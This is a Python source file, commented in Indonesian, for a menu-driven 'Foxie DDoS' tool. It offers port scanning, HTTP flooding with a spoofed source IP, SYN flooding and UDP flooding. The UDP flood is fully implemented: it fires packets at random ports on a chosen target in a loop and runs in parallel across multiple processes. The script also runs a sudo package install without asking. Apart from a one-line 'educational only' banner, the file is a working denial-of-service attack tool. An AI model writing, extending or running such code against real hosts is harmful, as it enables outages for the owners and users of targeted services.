from scapy.all import IP, TCP, Raw, send, RandShort # Melakukan Import dari library scapy
import threading # Import thread untuk melakukan untuk menjalankan beberapa tugas secara bersamaan
import time #import untuk melakukan jeda eksekusi program dalam waktu tertentu
import random # menghasilkan angka acak
import os # menjalankan perintah di sistem operasi 
import socket # untuk melakukan kinerja dengan socket untuk mengirim dan menerima data melalu jaringan
from multiprocessing import Process  # Modul multiprocessing yang dibutuhkan untuk proses pararel seperti DDoS dan Process sebagai pengelola proses terpisah
import datetime # digunakan untuk mendapatkan waktu realtime saat mengukur suatu operasi
from HTTPflood import flood_http, http_banner
from PortScan import port_scan
from SYNflood import FoxieSynFloodAttack, syn_banner
from UDPflood import udp_banner
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')


# Fungsi untuk membersihkan layar
def clear_terminal():
    # Windows
    if os.name == 'nt':
        os.system('cls')
    # Linux
    else:
        os.system('clear')

#Fungsi UDP Flood
def udp_flood(ip: str, port_from: int, port_to: int, times: int, timeout: int): # Mendefinisikan Tipe Data
    data = random.randint(1, 1024).to_bytes(length=8, byteorder="big", signed=False) # data sepanjang 8 byte yang dikirim sebagai payload di paket UDP
    now = datetime.datetime.now() # menyimpan dan menghitung waktu saat dieksekusi
    while True: # Looping infinite hingga di stop oleh user 
        port = random.randint(port_from, port_to)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Membuat Socket UDP Menggunakan IPv4 (AF_INET) dan protokol UDP (SOCK_DGRAM)
            addr = (str(ip), int(port)) #tupple tang berisi alamat IP target dan port
            for _ in range(times):
                s.sendto(data, addr)
            print("Sent to " + str(port) + " process " + str(os.getpid()))
            if (datetime.datetime.now() - now).total_seconds() > timeout: #menghitung selisih waktu antara waktu sekarang dan waktu awal, jika sudah timeout akan berhenti
                break
        except Exception as err:
            print("Error " + str(err)) # Jika terdapat error pada saat eksekusi program, loop akan dihentikan
            break

# Fungsi untuk menampilkan banner ASCII Foxie DDOS
def foxie_banner():
    
    RED = '\033[0;31m' # ANSI color code
    RESET = '\033[0m'
    CYAN = '\033[0;36m'
    # Install the required package to run the program
    os.system("sudo apt-get install -y cowsay lolcat") # menginstall cowsay dan lolcat sebagai balon teks dan lolcat sebagai penampil warna teks pelangi
    os.system('cowsay -t "HELLO GUYS !, Author: Putra Alpa \n Lets Break The System"| lolcat ')  
    print(f"""{CYAN}
 /$$$$$$$$        /$$   /$$ /$$ /$$$$$$$$                     /$$$$$$$  /$$$$$$$             /$$$$$$ 
| $$_____/       | $$  / $$|__/| $$_____/                    | $$__  $$| $$__  $$           /$$__  $$
| $$     /$$$$$$ |  $$/ $$/ /$$| $$                          | $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/
| $$$$$ /$$__  $$ \  $$$$/ | $$| $$$$$          /$$$$$$      | $$  | $$| $$  | $$ /$$__  $$|  $$$$$$ 
| $$__/| $$  \ $$  >$$  $$ | $$| $$__/         |______/      | $$  | $$| $$  | $$| $$  \ $$ \____  $$
| $$   | $$  | $$ /$$/\  $$| $$| $$                          | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$   |  $$$$$$/| $$  \ $$| $$| $$$$$$$$                    | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
|__/    \______/ |__/  |__/|__/|________/                    |_______/ |_______/  \______/  \______/
{RESET}                                                                                                                                                                                                                                                                                                               
    """)
    print(f"{RED}\n WARNING !!! Please Use It For Educational Only{RESET}\n\n")

# Fungsi untuk menampilkan menu pilihan
def tools_menu():
    RESET = '\033[0m' # ANSI color code
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'

    print(f"{GREEN} Welcome To My DDoS-Tools, Please Select\n{RESET}") # untuk menambahkan warna ke dalam teks
    print(f"{YELLOW} [1] Port Scanner\n{RESET}")
    print(f"{YELLOW} [2] HTTP Flood\n{RESET}")
    print(f"{YELLOW} [3] SYN Flood\n{RESET}")
    print(f"{YELLOW} [4] UDP Flood\n{RESET}")


def sub_menu(list):
    GREEN = '\033[0;32m'
    RESET = '\033[0m'

    if list == '1':
      port_scan()
    elif list == '2':
      http_banner()
      source_ip = input(f"{GREEN}Fake Source IP: {RESET}")
      target_ip = input(f"{GREEN}IP Target: {RESET}")
      port = int(input(f"{GREEN}Target Port: {RESET}"))
      packet_count = int(input(f"{GREEN}Input the packet counts: {RESET}"))
      flood_http(source_ip, target_ip, port, packet_count) # Setelah semua input dikumpulkan dari pengguna, fungsi flood_http() dipanggil dengan empat parameter
    elif list == '3':
      syn_banner()
      attack = FoxieSynFloodAttack()  # memanggil kelas FoxieSynFloodAttack untuk melakukan attack
      attack.attack() # memulai proses serangan SYN Flood dengan menggunakan input yang diminta dari pengguna dan mengirimkan paket-paket yang sudah diatur.
    elif list == '4':
      udp_banner()
      host = input(f"{GREEN}Target IP : {RESET}")
      port_from = int(input(f"{GREEN}Min port (default: 0): {RESET}") or 0)
      port_to = int(input(f"{GREEN}Max port (default: 65535): {RESET}") or 65535)
      packets = int(input(f"{GREEN}Packets per connection (default: 1000): {RESET}") or 1000) # jumlah paket yang dikirimkan per koneksi
      threads = int(input(f"{GREEN}Number of threads (default: 1): {RESET}") or 1)
      timeout = int(input(f"{GREEN}Timeout in seconds (default: 30): {RESET}") or 30)
      for _ in range(threads):
        Process(target=udp_flood, args=(host, port_from, port_to, packets, timeout)).start() # digunakan untuk menjalankan fungsi udp_flood dalam proses terpisah. Ini memungkinkan serangan dijalankan secara paralel di beberapa proses.

#-------------------------------------------------------------------------------------------------------------------------#

def main():
    GREEN = '\033[0;32m'
    RESET = '\033[0m'
    RED = '\033[0;31m'

    clear_terminal()  # Membersihkan layar
    foxie_banner()  # Menampilkan banner ASCII
    tools_menu()  # Menampilkan menu pilihan

    choice = input(f"{GREEN}Please Select The Tools: {RESET}")

    # Mengecek pilihan pengguna
    if choice in ['1', '2', '3', '4']:
            clear_terminal()  # Bersihkan layar untuk sub-menu
            sub_menu(choice)  # Menampilkan sub-menu sesuai pilihan kategori
            print(f"{GREEN}Sucesss{RESET}")
    else : 
        print(f"{RED}Wrong Keywords{RESET}")

if __name__ == "__main__":
    main() # Memastikan bahwa fungsi main() hanya dijalankan jika skrip dijalankan langsung, bukan ketika diimpor sebagai modul di skrip lain.
